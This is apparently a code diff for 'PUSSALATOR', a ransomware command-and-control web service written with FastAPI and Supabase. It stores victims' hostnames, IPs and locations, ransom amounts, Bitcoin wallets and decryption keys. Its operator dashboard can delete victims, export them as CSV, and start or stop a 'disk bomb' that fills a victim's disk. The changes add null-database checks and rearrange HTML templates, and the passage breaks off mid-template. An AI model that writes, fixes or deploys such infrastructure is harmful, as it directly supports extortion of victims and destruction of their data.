+            if (!confirm(`⚠️ DELETE ${currentVictim.id}?`)) return;
+            
+            try {
+                const response = await fetch(`/api/owner/delete-victim/${currentVictim.id}`, {
+                    method: 'DELETE'
+                });
+                
+                if (response.ok) {
+                    alert('Victim deleted');
+                    closeModal();
+                    loadVictims();
+                    loadStats();
+                }
+            } catch(e) {
+                alert('Error deleting victim');
+            }
+        }
+        
+        async function updateVictim() {
+            if (!currentVictim) return;
+            
+            const data = {
+                ransom_amount: document.getElementById('editRansom').value,
+                btc_address: document.getElementById('editBtc').value,
+                notes: document.getElementById('editNotes').value
+            };
+            
+            try {
+                const response = await fetch(`/api/owner/victim/${currentVictim.id}`, {
+                    method: 'PUT',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    alert('Victim updated!');
+                    closeModal();
+                    loadVictims();
+                }
+            } catch(e) {
+                alert('Error updating victim');
+            }
+        }
+        
+        async function showLogs() {
+            document.getElementById('logsModal').classList.add('show');
+            document.getElementById('logsContainer').innerHTML = 'Loading logs...';
+            
+            try {
+                const response = await fetch('/api/owner/logs');
+                const logs = await response.json();
+                
+                let html = '';
+                logs.forEach(log => {
+                    html += `<div class="log-entry">[${log.time?.slice(0,19) || ''}] ${log.level}: ${log.message}</div>`;
+                });
+                
+                document.getElementById('logsContainer').innerHTML = html || 'No logs';
+            } catch(e) {
+                document.getElementById('logsContainer').innerHTML = 'Error loading logs';
+            }
+        }
+        
+        function closeLogs() {
+            document.getElementById('logsModal').classList.remove('show');
+        }
+        
+        function exportData() {
+            let csv = 'Victim ID,Status,Hostname,IP,Country,City,Files,Ransom\n';
+            victims.forEach(v => {
+                csv += `"${v.id}",${v.status},"${v.hostname}",${v.ip},"${v.country}","${v.city}",${v.files},"${v.ransom}"\n`;
+            });
+            
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `victims_${new Date().toISOString().slice(0,10)}.csv`;
+            a.click();
+        }
+        
+        async function logout() {
+            await fetch('/api/owner/logout', { method: 'POST' });
+            window.location.href = '/';
+        }
+        
+        // Load data on page load
+        loadData();
+        setInterval(loadData, 30000);
+    </script>
+</body>
+</html>
+"""
+
+# ============================================================================
 # ROUTES - PUBLIC PAGES
 # ============================================================================
 
@@ -280,7 +1370,7 @@ async def login_page():
 @app.get("/victim/{victim_id}", response_class=HTMLResponse)
 async def victim_page(victim_id: str):
     """Victim status page"""
-    html = VICTIM_PAGE.replace('{{ victim_id }}', victim_id)
+    html = VICTIM_PAGE_TEMPLATE.replace('{{ victim_id }}', victim_id)
     return HTMLResponse(content=html)
 
 @app.get("/owner/dashboard", response_class=HTMLResponse)
@@ -292,7 +1382,7 @@ async def owner_dashboard(request: Request):
     if not session_data.get('owner_logged_in'):
         return RedirectResponse(url='/')
     
-    return HTMLResponse(content=OWNER_DASHBOARD)
+    return HTMLResponse(content=OWNER_DASHBOARD_TEMPLATE)
 
 # ============================================================================
 # ROUTES - API (Public)
@@ -306,6 +1396,9 @@ async def api_stats():
 @app.get("/api/victim/{victim_id}")
 async def api_get_victim(victim_id: str):
     """Get victim details (public)"""
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
         
@@ -335,6 +1428,9 @@ async def api_get_victim(victim_id: str):
 @app.post("/api/add-victim")
 async def api_add_victim(victim_data: VictimRegister):
     """Register new victim (called by client)"""
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         victim_id = victim_data.victim_id or generate_victim_id()
         
@@ -419,6 +1515,9 @@ async def api_add_victim(victim_data: VictimRegister):
 @app.post("/api/update-victim")
 async def api_update_victim(update_data: VictimUpdate):
     """Update victim info"""
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         update_dict = {
             'last_seen': datetime.utcnow().isoformat()
@@ -437,6 +1536,9 @@ async def api_update_victim(update_data: VictimUpdate):
 @app.post("/api/verify-payment")
 async def api_verify_payment(payment_data: PaymentVerify):
     """Verify payment from client"""
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         # Update victim
         supabase_admin.table('victims').update({
@@ -463,6 +1565,9 @@ async def api_verify_payment(payment_data: PaymentVerify):
 @app.get("/api/bomb/command/{victim_id}")
 async def api_get_bomb_command(victim_id: str):
     """Get pending bomb command"""
+    if not supabase_admin:
+        return {'action': 'none'}
+    
     result = supabase_admin.table('victims').select('bomb_status').eq('id', victim_id).execute()
     
     if result.data and result.data[0].get('bomb_status') == 'active':
@@ -473,6 +1578,9 @@ async def api_get_bomb_command(victim_id: str):
 @app.post("/api/bomb/update")
 async def api_bomb_update(bomb_data: BombUpdate):
     """Update bomb status"""
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         update_dict = {}
         
@@ -506,7 +1614,7 @@ async def api_owner_login(login_data: OwnerLogin, request: Request, response: Re
             key='session_id',
             value=session_id,
             httponly=True,
-            max_age=86400,  # 24 hours
+            max_age=86400,
             samesite='lax'
         )
         
@@ -534,6 +1642,9 @@ async def api_owner_victims(request: Request):
     if not session_data.get('owner_logged_in'):
         raise HTTPException(status_code=401, detail="Unauthorized")
     
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         result = supabase_admin.table('victims').select('*').order('created', desc=True).execute()
         return result.data
@@ -548,6 +1659,9 @@ async def api_owner_victim(victim_id: str, request: Request):
     
     if not session_data.get('owner_logged_in'):
         raise HTTPException(status_code=401, detail="Unauthorized")
+    
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
     
     try:
         result = supabase_admin.table('victims').select('*').eq('id', victim_id).execute()
@@ -569,6 +1683,9 @@ async def api_owner_update_victim(victim_id: str, update_data: VictimUpdateAdmin
     
     if not session_data.get('owner_logged_in'):
         raise HTTPException(status_code=401, detail="Unauthorized")
+    
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
     
     try:
         update_dict = {}
@@ -605,6 +1722,9 @@ async def api_owner_bomb_start(bomb_data: BombControl, request: Request):
     if not session_data.get('owner_logged_in'):
         raise HTTPException(status_code=401, detail="Unauthorized")
     
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         supabase_admin.table('victims').update({
             'bomb_status': 'active',
@@ -627,6 +1747,9 @@ async def api_owner_bomb_stop(bomb_data: BombControl, request: Request):
     if not session_data.get('owner_logged_in'):
         raise HTTPException(status_code=401, detail="Unauthorized")
     
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         supabase_admin.table('victims').update({
             'bomb_status': 'stopped'
@@ -647,6 +1770,9 @@ async def api_owner_mark_paid(victim_id: str, request: Request):
     
     if not session_data.get('owner_logged_in'):
         raise HTTPException(status_code=401, detail="Unauthorized")
+    
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
     
     try:
         supabase_admin.table('victims').update({
@@ -670,6 +1796,9 @@ async def api_owner_delete_victim(victim_id: str, request: Request):
     if not session_data.get('owner_logged_in'):
         raise HTTPException(status_code=401, detail="Unauthorized")
     
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         supabase_admin.table('victims').delete().eq('id', victim_id).execute()
         log_action('delete_victim', f'Deleted {victim_id}', victim_id)
@@ -686,1033 +1815,14 @@ async def api_owner_logs(request: Request):
     if not session_data.get('owner_logged_in'):
         raise HTTPException(status_code=401, detail="Unauthorized")
     
+    if not supabase_admin:
+        raise HTTPException(status_code=503, detail="Database not configured")
+    
     try:
         result = supabase_admin.table('system_logs').select('*').order('time', desc=True).limit(100).execute()
         return result.data
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
-
-# ============================================================================
-# HTML TEMPLATES - FIXED: Properly assigned to variables
-# ============================================================================
-
-INDEX_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PUSSALATOR</title>
-    <meta charset="utf-8">
-    <style>
-        body {
-            background: black;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            margin: 0;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 100px auto;
-            border: 3px solid #ff0000;
-            padding: 40px;
-            background: #0a0a0a;
-            box-shadow: 0 0 30px #ff0000;
-            text-align: center;
-        }
-        
-        h1 {
-            font-size: 60px;
-            color: #ff0000;
-            text-shadow: 0 0 20px #ff0000;
-            margin-bottom: 20px;
-            animation: flicker 2s infinite;
-        }
-        
-        @keyframes flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.8; }
-            51% { opacity: 1; }
-            60% { opacity: 0.9; }
-            100% { opacity: 1; }
-        }
-        
-        .subtitle {
-            color: #ff6666;
-            margin-bottom: 40px;
-            font-size: 18px;
-        }
-        
-        .button {
-            background: #ff0000;
-            color: black;
-            border: none;
-            padding: 15px 30px;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            font-size: 18px;
-            cursor: pointer;
-            margin: 10px;
-            width: 250px;
-            transition: 0.3s;
-        }
-        
-        .button:hover {
-            background: #ff6666;
-            box-shadow: 0 0 20px #ff0000;
-        }
-        
-        .victim-button {
-            background: black;
-            color: #00ff00;
-            border: 2px solid #00ff00;
-        }
-        
-        .victim-button:hover {
-            background: #00ff00;
-            color: black;
-        }
-        
-        .ascii {
-            color: #ff0000;
-            font-size: 12px;
-            white-space: pre;
-            margin: 20px 0;
-        }
-        
-        .stats {
-            color: #ff6666;
-            margin-top: 30px;
-            font-size: 14px;
-            min-height: 30px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="ascii">
-    /\\____/\\    /\\____/\\
-   (  o  o  )  (  o  o  )
-   (   ==   )  (   ==   )
-    (______)    (______)
-        </div>
-        
-        <h1>PUSSALATOR</h1>
-        <div class="subtitle">> SYSTEM CONTROL PANEL <</div>
-        
-        <a href="/victim">
-            <button class="button victim-button">VICTIM PORTAL</button>
-        </a>
-        
-        <a href="/owner/login">
-            <button class="button">OWNER LOGIN</button>
-        </a>
-        
-        <div class="stats" id="stats">Loading stats...</div>
-    </div>
-
-    <script>
-        async function loadStats() {
-            try {
-                const r = await fetch('/api/stats');
-                const s = await r.json();
-                document.getElementById('stats').innerHTML = 
-                    `Victims: ${s.total} | Paid: ${s.paid} | BTC: ${s.btc} | Bombs: ${s.bombs}`;
-            } catch(e) {
-                document.getElementById('stats').innerHTML = 'Stats temporarily unavailable';
-            }
-        }
-        
-        loadStats();
-        setInterval(loadStats, 10000);
-    </script>
-</body>
-</html>
-"""
-
-VICTIM_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PUSSALATOR - Victim Portal</title>
-    <meta charset="utf-8">
-    <style>
-        body {
-            background: black;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            margin: 0;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            border: 3px solid #00ff00;
-            padding: 30px;
-            background: #0a0a0a;
-        }
-        
-        h1 {
-            font-size: 36px;
-            color: #00ff00;
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .warning {
-            background: #1a1a1a;
-            border: 1px solid #00ff00;
-            padding: 20px;
-            margin-bottom: 30px;
-            color: #ff6666;
-        }
-        
-        .input-group {
-            margin: 20px 0;
-        }
-        
-        label {
-            display: block;
-            color: #00ff00;
-            margin-bottom: 5px;
-        }
-        
-        input {
-            width: 100%;
-            padding: 10px;
-            background: black;
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        
-        button {
-            background: #00ff00;
-            color: black;
-            border: none;
-            padding: 12px 24px;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.3s;
-        }
-        
-        button:hover {
-            background: #66ff66;
-        }
-        
-        .result {
-            margin-top: 20px;
-            padding: 20px;
-            background: #1a1a1a;
-            border: 1px solid #00ff00;
-            min-height: 100px;
-        }
-        
-        .back {
-            text-align: center;
-            margin-top: 20px;
-        }
-        
-        .back a {
-            color: #666666;
-            text-decoration: none;
-        }
-        
-        .back a:hover {
-            color: #00ff00;
-        }
-        
-        .key-box {
-            background: black;
-            padding: 15px;
-            word-break: break-all;
-            font-family: monospace;
-            border: 1px solid #00ff00;
-            margin: 10px 0;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🔓 VICTIM PORTAL</h1>
-        
-        <div class="warning">
-            Enter your Client ID to check payment status and get decryption key.
-        </div>
-        
-        <div class="input-group">
-            <label>CLIENT ID:</label>
-            <input type="text" id="victim_id" placeholder="e.g., DESKTOP-ABC123-20250312-1A2B3C4D">
-        </div>
-        
-        <button onclick="checkVictim()">CHECK STATUS</button>
-        
-        <div id="result" class="result" style="display:none;"></div>
-        
-        <div class="back">
-            <a href="/">← Back to Main</a>
-        </div>
-    </div>
-
-    <script>
-        async function checkVictim() {
-            const id = document.getElementById('victim_id').value.trim();
-            if (!id) {
-                alert('Enter Client ID');
-                return;
-            }
-            
-            const result = document.getElementById('result');
-            result.style.display = 'block';
-            result.innerHTML = 'Loading...';
-            
-            try {
-                const r = await fetch(`/api/victim/${id}`);
-                
-                if (r.status === 200) {
-                    const v = await r.json();
-                    const deadline = new Date(v.deadline).toLocaleString();
-                    
-                    if (v.status === 'paid') {
-                        result.innerHTML = `
-                            <h3 style="color: #00ff00;">✅ PAYMENT VERIFIED</h3>
-                            <p><strong>Client ID:</strong> ${v.id}</p>
-                            <p><strong>Decryption Key:</strong></p>
-                            <div class="key-box">${v.key}</div>
-                            <p style="color: #ffff00;">Use this key with the recovery tool.</p>
-                        `;
-                    } else {
-                        result.innerHTML = `
-                            <h3 style="color: #ff0000;">⏳ PAYMENT PENDING</h3>
-                            <p><strong>Client ID:</strong> ${v.id}</p>
-                            <p><strong>Files Encrypted:</strong> ${v.files}</p>
-                            <p><strong>Ransom:</strong> ${v.ransom}</p>
-                            <p><strong>Wallet:</strong> ${v.wallet}</p>
-                            <p><strong>Deadline:</strong> ${deadline}</p>
-                            <p><strong>Bomb Status:</strong> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}</p>
-                            <p style="color: #ffff00;">Send payment to the wallet address above.</p>
-                        `;
-                    }
-                } else {
-                    result.innerHTML = '<h3 style="color: #ff0000;">❌ Client ID not found</h3>';
-                }
-            } catch(e) {
-                result.innerHTML = '<h3 style="color: #ff0000;">❌ Error connecting to server</h3>';
-            }
-        }
-    </script>
-</body>
-</html>
-"""
-
-OWNER_LOGIN_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PUSSALATOR - Owner Login</title>
-    <meta charset="utf-8">
-    <style>
-        body {
-            background: black;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
-            margin: 0;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 400px;
-            margin: 100px auto;
-            border: 3px solid #ff0000;
-            padding: 30px;
-            background: #0a0a0a;
-            text-align: center;
-        }
-        
-        h1 {
-            font-size: 36px;
-            color: #ff0000;
-            margin-bottom: 30px;
-        }
-        
-        .input-group {
-            margin: 20px 0;
-        }
-        
-        input {
-            width: 100%;
-            padding: 12px;
-            background: black;
-            border: 1px solid #ff0000;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        
-        button {
-            background: #ff0000;
-            color: black;
-            border: none;
-            padding: 12px 24px;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.3s;
-        }
-        
-        button:hover {
-            background: #ff6666;
-        }
-        
-        .error {
-            color: #ff6666;
-            margin: 10px 0;
-            min-height: 20px;
-        }
-        
-        .back {
-            margin-top: 20px;
-        }
-        
-        .back a {
-            color: #666666;
-            text-decoration: none;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>👑 OWNER LOGIN</h1>
-        
-        <div id="error" class="error"></div>
-        
-        <div class="input-group">
-            <input type="password" id="password" placeholder="ENTER PASSWORD" onkeypress="handleKey(event)">
-        </div>
-        
-        <button onclick="login()">LOGIN</button>
-        
-        <div class="back">
-            <a href="/">← Back to Main</a>
-        </div>
-    </div>
-
-    <script>
-        function handleKey(e) {
-            if (e.key === 'Enter') login();
-        }
-        
-        async function login() {
-            const pwd = document.getElementById('password').value;
-            try {
-                const r = await fetch('/api/owner/login', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({password: pwd})
-                });
-                const d = await r.json();
-                
-                if (d.success) {
-                    window.location.href = '/owner/dashboard';
-                } else {
-                    document.getElementById('error').innerHTML = '❌ Invalid password';
-                    document.getElementById('password').value = '';
-                }
-            } catch(e) {
-                document.getElementById('error').innerHTML = '❌ Connection error';
-            }
-        }
-    </script>
-</body>
-</html>
-"""
-
-OWNER_DASHBOARD_HTML = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PUSSALATOR - Dashboard</title>
-    <meta charset="utf-8">
-    <style>
-        body {
-            background: black;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            margin: 0;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-        
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid #ff0000;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        
-        .header h1 {
-            color: #ff0000;
-            font-size: 36px;
-            margin: 0;
-        }
-        
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-        
-        .stat-card {
-            border: 2px solid #ff0000;
-            padding: 20px;
-            text-align: center;
-            background: #1a0000;
-            min-height: 80px;
-        }
-        
-        .stat-value {
-            font-size: 32px;
-            font-weight: bold;
-            color: #ff0000;
-        }
-        
-        .stat-label {
-            color: #ff6666;
-            font-size: 12px;
-        }
-        
-        .panel {
-            border: 2px solid #ff0000;
-            padding: 20px;
-            margin-bottom: 20px;
-            background: #1a1a1a;
-        }
-        
-        .panel h3 {
-            color: #ff0000;
-            margin-top: 0;
-            border-bottom: 1px solid #ff0000;
-            padding-bottom: 10px;
-        }
-        
-        .bomb-control {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        
-        input, select {
-            background: black;
-            border: 1px solid #ff0000;
-            color: #00ff00;
-            padding: 10px;
-            font-family: 'Courier New', monospace;
-            flex: 1;
-            min-width: 200px;
-            box-sizing: border-box;
-        }
-        
-        button {
-            background: #ff0000;
-            color: black;
-            border: none;
-            padding: 10px 20px;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        
-        button:hover {
-            background: #ff6666;
-        }
-        
-        .danger {
-            background: black;
-            color: #ff0000;
-            border: 1px solid #ff0000;
-        }
-        
-        .danger:hover {
-            background: #ff0000;
-            color: black;
-        }
-        
-        .table-container {
-            overflow-x: auto;
-            min-height: 200px;
-        }
-        
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        
-        th {
-            background: #ff0000;
-            color: black;
-            padding: 10px;
-            position: sticky;
-            top: 0;
-        }
-        
-        td {
-            border: 1px solid #ff0000;
-            padding: 8px;
-        }
-        
-        .status-paid {
-            color: #00ff00;
-            font-weight: bold;
-        }
-        
-        .status-unpaid {
-            color: #ff0000;
-            font-weight: bold;
-        }
-        
-        .status-active {
-            color: #ffaa00;
-            font-weight: bold;
-        }
-        
-        .progress-bar {
-            width: 100px;
-            height: 20px;
-            background: #1a1a1a;
-            border: 1px solid #ff0000;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: #ff0000;
-        }
-        
-        .logs {
-            height: 200px;
-            overflow-y: auto;
-            background: black;
-            border: 1px solid #ff0000;
-            padding: 10px;
-            font-size: 12px;
-        }
-        
-        .logout-btn {
-            background: black;
-            color: #ff0000;
-            border: 1px solid #ff0000;
-            padding: 8px 16px;
-            cursor: pointer;
-        }
-        
-        .logout-btn:hover {
-            background: #ff0000;
-            color: black;
-        }
-        
-        .tabs {
-            display: flex;
-            gap: 2px;
-            margin-bottom: 20px;
-        }
-        
-        .tab {
-            background: #1a1a1a;
-            color: #ff6666;
-            padding: 10px 20px;
-            cursor: pointer;
-            border: 1px solid #ff0000;
-            border-bottom: none;
-            flex: 1;
-            text-align: center;
-        }
-        
-        .tab.active {
-            background: #ff0000;
-            color: black;
-            font-weight: bold;
-        }
-        
-        .tab-content {
-            display: none;
-        }
-        
-        .tab-content.active {
-            display: block;
-        }
-        
-        .victim-info {
-            margin-bottom: 20px;
-            padding: 15px;
-            background: #1a1a1a;
-            border: 1px solid #ff0000;
-            min-height: 100px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>👑 PUSSALATOR DASHBOARD</h1>
-            <div>
-                <span id="timestamp" style="color: #666666; margin-right: 20px;"></span>
-                <button class="logout-btn" onclick="logout()">LOGOUT</button>
-            </div>
-        </div>
-        
-        <div class="stats" id="stats">
-            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">VICTIMS</div></div>
-            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">PAID</div></div>
-            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">UNPAID</div></div>
-            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">BTC</div></div>
-            <div class="stat-card"><div class="stat-value">-</div><div class="stat-label">BOMBS</div></div>
-        </div>
-        
-        <div class="tabs">
-            <div class="tab active" onclick="showTab('victims')">📋 VICTIMS</div>
-            <div class="tab" onclick="showTab('bombs')">💣 BOMB CONTROL</div>
-            <div class="tab" onclick="showTab('logs')">📝 LOGS</div>
-        </div>
-        
-        <div id="victims-tab" class="tab-content active">
-            <div class="panel">
-                <h3>📋 VICTIM LOOKUP</h3>
-                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
-                    <input type="text" id="victim_id" placeholder="Enter Victim ID">
-                    <button onclick="getVictim()">GET VICTIM</button>
-                    <button class="danger" onclick="deleteVictim()">DELETE</button>
-                </div>
-                <div id="victim_info" class="victim-info">Enter a Victim ID to view details</div>
-            </div>
-            
-            <div class="panel">
-                <h3>📊 ALL VICTIMS</h3>
-                <div class="table-container">
-                    <table id="victims_table">
-                        <thead>
-                            <tr>
-                                <th>ID</th>
-                                <th>FILES</th>
-                                <th>LOCATION</th>
-                                <th>IP</th>
-                                <th>STATUS</th>
-                                <th>BOMB</th>
-                                <th>DEADLINE</th>
-                                <th>ACTIONS</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr><td colspan="8">Loading victims...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-        </div>
-        
-        <div id="bombs-tab" class="tab-content">
-            <div class="panel">
-                <h3>💣 DISK BOMB CONTROL</h3>
-                <div class="bomb-control">
-                    <input type="text" id="bomb_client" placeholder="Client ID">
-                    <input type="text" id="bomb_file" value="explosion.dat">
-                </div>
-                <div class="bomb-control">
-                    <button onclick="startBomb()">💣 START BOMB</button>
-                    <button class="danger" onclick="stopBomb()">🛑 STOP BOMB</button>
-                    <button onclick="checkBomb()">📊 CHECK STATUS</button>
-                </div>
-                <div id="bomb_status" style="margin-top: 20px;"></div>
-                <div class="progress-bar" id="bomb_progress" style="display:none;">
-                    <div class="progress-fill" id="bomb_fill" style="width:0%"></div>
-                </div>
-            </div>
-            
-            <div class="panel">
-                <h3>💣 ACTIVE BOMBS</h3>
-                <div class="table-container">
-                    <table id="bombs_table">
-                        <thead>
-                            <tr>
-                                <th>CLIENT ID</th>
-                                <th>SIZE</th>
-                                <th>STATUS</th>
-                                <th>LAST SEEN</th>
-                                <th>ACTION</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr><td colspan="5">No active bombs</td></tr>
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-        </div>
-        
-        <div id="logs-tab" class="tab-content">
-            <div class="panel">
-                <h3>📝 SYSTEM LOGS</h3>
-                <div class="logs" id="logs">Loading logs...</div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        let currentTab = 'victims';
-        let updateInterval;
-        
-        function showTab(tab) {
-            currentTab = tab;
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            document.querySelector(`.tab:nth-child(${tab === 'victims' ? 1 : tab === 'bombs' ? 2 : 3})`).classList.add('active');
-            document.getElementById(`${tab}-tab`).classList.add('active');
-        }
-        
-        async function loadStats() {
-            try {
-                const r = await fetch('/api/stats');
-                const s = await r.json();
-                document.getElementById('stats').innerHTML = `
-                    <div class="stat-card"><div class="stat-value">${s.total}</div><div class="stat-label">VICTIMS</div></div>
-                    <div class="stat-card"><div class="stat-value">${s.paid}</div><div class="stat-label">PAID</div></div>
-                    <div class="stat-card"><div class="stat-value">${s.unpaid}</div><div class="stat-label">UNPAID</div></div>
-                    <div class="stat-card"><div class="stat-value">${s.btc}</div><div class="stat-label">BTC</div></div>
-                    <div class="stat-card"><div class="stat-value">${s.bombs}</div><div class="stat-label">BOMBS</div></div>
-                `;
-            } catch(e) {}
-        }
-        
-        async function loadVictims() {
-            try {
-                const r = await fetch('/api/victims');
-                const v = await r.json();
-                let html = '';
-                for (const [id, data] of Object.entries(v)) {
-                    const deadline = new Date(data.deadline).toLocaleString();
-                    const bombStatus = data.bomb_status === 'active' ? 
-                        `<span class="status-active">ACTIVE ${data.bomb_size.toFixed(1)}GB</span>` : 
-                        'inactive';
-                    html += `<tr>
-                        <td>${id}</td>
-                        <td>${data.files}</td>
-                        <td>${data.city || '?'}, ${data.country || '?'}</td>
-                        <td>${data.ip}</td>
-                        <td class="${data.status === 'paid' ? 'status-paid' : 'status-unpaid'}">${data.status}</td>
-                        <td>${bombStatus}</td>
-                        <td>${deadline}</td>
-                        <td><button class="danger" onclick="quickDelete('${id}')">X</button></td>
-                    </tr>`;
-                }
-                document.querySelector('#victims_table tbody').innerHTML = html || '<tr><td colspan="8">No victims found</td></tr>';
-            } catch(e) {}
-        }
-        
-        async function loadBombs() {
-            try {
-                const r = await fetch('/api/victims');
-                const v = await r.json();
-                let html = '';
-                for (const [id, data] of Object.entries(v)) {
-                    if (data.bomb_status === 'active') {
-                        html += `<tr>
-                            <td>${id}</td>
-                            <td>${data.bomb_size.toFixed(2)} GB</td>
-                            <td class="status-active">ACTIVE</td>
-                            <td>${new Date(data.last_seen).toLocaleString()}</td>
-                            <td><button class="danger" onclick="quickStop('${id}')">STOP</button></td>
-                        </tr>`;
-                    }
-                }
-                document.querySelector('#bombs_table tbody').innerHTML = html || '<tr><td colspan="5">No active bombs</td></tr>';
-            } catch(e) {}
-        }
-        
-        async function loadLogs() {
-            try {
-                const r = await fetch('/api/logs');
-                const l = await r.json();
-                let html = '';
-                l.slice(-50).forEach(log => {
-                    html += `<div>[${log.time.slice(11,19)}] ${log.level}: ${log.msg}</div>`;
-                });
-                document.getElementById('logs').innerHTML = html || 'No logs';
-            } catch(e) {}
-        }
-        
-        async function startBomb() {
-            const client = document.getElementById('bomb_client').value;
-            const file = document.getElementById('bomb_file').value;
-            if (!client) return alert('Enter Client ID');
-            
-            try {
-                const r = await fetch('/api/bomb/start', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({client_id: client, filename: file})
-                });
-                const d = await r.json();
-                if (d.success) {
-                    alert('Bomb command sent');
-                    setTimeout(checkBomb, 2000);
-                }
-            } catch(e) {
-                alert('Error sending command');
-            }
-        }
-        
-        async function stopBomb() {
-            const client = document.getElementById('bomb_client').value;
-            if (!client) return alert('Enter Client ID');
-            
-            try {
-                const r = await fetch('/api/bomb/stop', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({client_id: client})
-                });
-                const d = await r.json();
-                if (d.success) {
-                    alert('Stop command sent');
-                    document.getElementById('bomb_progress').style.display = 'none';
-                    document.getElementById('bomb_status').innerHTML = '';
-                }
-            } catch(e) {
-                alert('Error sending command');
-            }
-        }
-        
-        async function checkBomb() {
-            const client = document.getElementById('bomb_client').value;
-            if (!client) return;
-            
-            try {
-                const r = await fetch(`/api/victim/${client}`);
-                if (r.status === 200) {
-                    const v = await r.json();
-                    if (v.bomb_status === 'active') {
-                        document.getElementById('bomb_status').innerHTML = 
-                            `<div>Bomb ACTIVE - Size: ${v.bomb_size.toFixed(2)} GB</div>`;
-                        document.getElementById('bomb_progress').style.display = 'block';
-                        document.getElementById('bomb_fill').style.width = `${Math.min(v.bomb_size, 100)}%`;
-                    } else {
-                        document.getElementById('bomb_status').innerHTML = 'No active bomb';
-                        document.getElementById('bomb_progress').style.display = 'none';
-                    }
-                }
-            } catch(e) {}
-        }
-        
-        async function quickStop(clientId) {
-            try {
-                const r = await fetch('/api/bomb/stop', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({client_id: clientId})
-                });
-                if (r.ok) {
-                    loadBombs();
-                    loadVictims();
-                }
-            } catch(e) {}
-        }
-        
-        async function getVictim() {
-            const id = document.getElementById('victim_id').value;
-            if (!id) return;
-            
-            try {
-                const r = await fetch(`/api/victim/${id}`);
-                if (r.status === 200) {
-                    const v = await r.json();
-                    document.getElementById('victim_info').innerHTML = `
